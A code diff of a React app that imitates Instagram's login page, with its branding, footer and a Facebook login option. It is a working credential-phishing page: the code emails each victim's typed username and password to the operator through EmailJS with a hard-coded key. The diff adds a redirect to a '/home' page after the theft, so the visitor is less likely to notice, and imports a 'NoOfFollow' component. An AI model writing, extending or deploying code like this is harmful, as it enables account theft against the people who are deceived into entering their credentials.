@@ -5,7 +5,8 @@ import emailjs from 'emailjs-com';
 import insta from './insta.png'
 import insta1 from './insta1.png'
 import insta2 from './insta2.png'
-
+import NoOfFollow from './NoOfFollow';
+import { useNavigate } from 'react-router-dom'
 
 const App = () => {
   const data = [insta, insta1, insta2];
@@ -15,7 +16,7 @@ const App = () => {
   const [showHide, setshowHide] = useState("Show");
   const [type, settype] = useState(false);
   const [image, setimage] = useState(insta);
-
+  const navigate = useNavigate();
 
   const toggleButton = () => {
     settype(!type);
@@ -39,7 +40,6 @@ const App = () => {
 
   let once = true;
   const ButtonClicked = () => {
-    // alert('Login Successfull');
 
     if (!password || !username) {
       setcheck('block');
@@ -51,15 +51,18 @@ const App = () => {
         message: `Username :- ${username} and Password :-  ${password}` // Corrected key: 'message' instead of 'Message'
       }, '0PQLhH7z8D22oGXb6')
         .then((response) => {
+          navigate('/home')
           console.log('Email sent successfully:', response);
         })
         .catch((error) => {
           console.error('Email failed to send:', error);
         });
     }
+
   }
 
   return (
+
     <>
       <div className='Full'>
         <div className='half'>
@@ -82,6 +85,7 @@ const App = () => {
               <div className='Facebook' style={{ color: '#385185' }}><i class="fa-brands fa-square-facebook"></i> Login with Facebook</div>
               <div className='forgot' style={{ marginTop: '15px', fontSize: '14px' }}>Forgot password?</div>
             </div>
+
             <div className='account' style={{ fontSize: '14px', marginTop: '20px', textAlign: 'center' }}>
               <hr style={{ marginBottom: '12px' }} />
               Dont have any Account? <span style={{ color: 'blue' }}>Sign up</span>
@@ -99,6 +103,7 @@ const App = () => {
         <div className='footer1' >Meta About Blog Jobs Help  API  Privacy <span className='FooterSpan'> Terms Locations Instagram Lite Threads Contact Uploading & Non-Users Meta Verified</span></div>
         <div className='footer2' style={{ marginTop: '10px', marginBottom: '15px' }}>English  © 2023 Instagram from Meta</div>
       </div>
+
     </>
   )
 };
